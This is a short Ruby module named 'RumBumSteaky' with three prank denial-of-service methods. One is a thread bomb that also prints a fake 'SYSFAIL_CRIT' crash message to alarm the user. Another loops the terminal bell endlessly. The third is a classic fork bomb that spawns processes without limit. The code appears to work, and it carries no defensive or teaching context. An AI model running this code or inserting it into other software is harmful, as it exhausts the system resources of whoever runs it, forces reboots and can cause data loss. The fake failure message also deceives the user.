module RumBumSteaky
	def RumBumSteaky.ProcBomb(interval = 0)
		f=lambda{Thread.new{sleep interval+3;loop{Thread.new{f.call}}}}
		Thread.new{sleep interval;print "\n=> SYSFAIL_CRIT\nirb(main):$$$:$> "}
		f.call
		nil
	end

	def RumBumSteaky.SoundBomb(interval = 0)
		s=lambda{Thread.new{loop{print "\x07"}}}
		sleep interval
		loop{s.call}
	end

	def RumBumSteaky.ForkBomb(interval = 0)
		loop { sleep interval; fork }
	end
end
